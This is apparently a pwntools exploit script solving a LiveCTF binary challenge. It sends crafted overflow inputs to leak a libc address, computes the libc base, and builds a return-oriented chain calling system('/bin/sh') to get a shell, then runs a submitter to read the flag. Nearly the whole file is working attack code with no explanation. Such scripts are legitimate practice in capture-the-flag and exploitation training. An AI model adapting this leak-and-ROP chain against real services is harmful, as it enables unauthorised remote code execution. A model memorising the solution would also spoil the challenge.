import sys
from time import sleep

LOCAL = "LOCAL" in sys.argv
#LOCAL = True

from pwn import *

BIN_NAME = '../handout/challenge'
REMOTE_ADDR = os.environ.get('HOST', 'localhost')
REMOTE_PORT = 31337
REMOTE_LIBC_PATH = 'libc.so.6'

if LOCAL: stream = process(BIN_NAME)
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)


stream.sendlineafter(b"?", b"10")
stream.sendlineafter(b"?", b"7")

stream.sendlineafter(b"?", b"A"*9 + bytes([0x46]))
stream.sendlineafter(b"?", b'A' * 8 + b"\xf0"*(0x45 - 8) + bytes([0xf0]))
stream.sendlineafter(b"?", b'A' * (0x60) + b"\xff"*(0x70-0x60))
for _ in range(5):
  stream.recvline()
o = b''
l = stream.recvline().split(b' ')
print(f'{l=}')
for i in range(2, len(l), 2):
  o += l[i]

print(f'{o=}')

libc_base = u64(o[11:19]) - 0x29d90
print(hex(libc_base))

stream.sendlineafter(b"?", b'A' * 0x40)
payload  = b"2" * 0x8
if LOCAL:
  payload += p64(libc_base + 0x001bbea2) # ret
  payload += p64(libc_base + 0x001bbea1) # pop rdi
  payload += p64(libc_base + 0x1d8678) # /bin/sh
  payload += p64(libc_base + 0x50d70) # system
else:
  payload += p64(libc_base + 0x2a3e6)
  payload += p64(libc_base + 0x2a3e5)
  payload += p64(libc_base + 0x1d8698)
  payload += p64(libc_base + 0x50d60)
payload += b"\x00"*114
stream.sendlineafter(b"?", b'B' * 0x48 + b"1"*6 + b"\x65" + payload)
stream.sendlineafter(b"?", b'C' * 0x44 + b"\x65")
#input("> ")
stream.sendlineafter(b"?", b"33333" + b"D"*0x31 + b"\x65" + b"4444")

if LOCAL:
  stream.interactive()
else:
  sleep(1)
  stream.sendline(b"./submitter")
  while True:
    try:
      flag = stream.recvline()
      print(flag)
      if b'LiveCTF{' not in flag: continue
      print(flag.strip().decode())
      break
    except Exception as e:
      print(e)
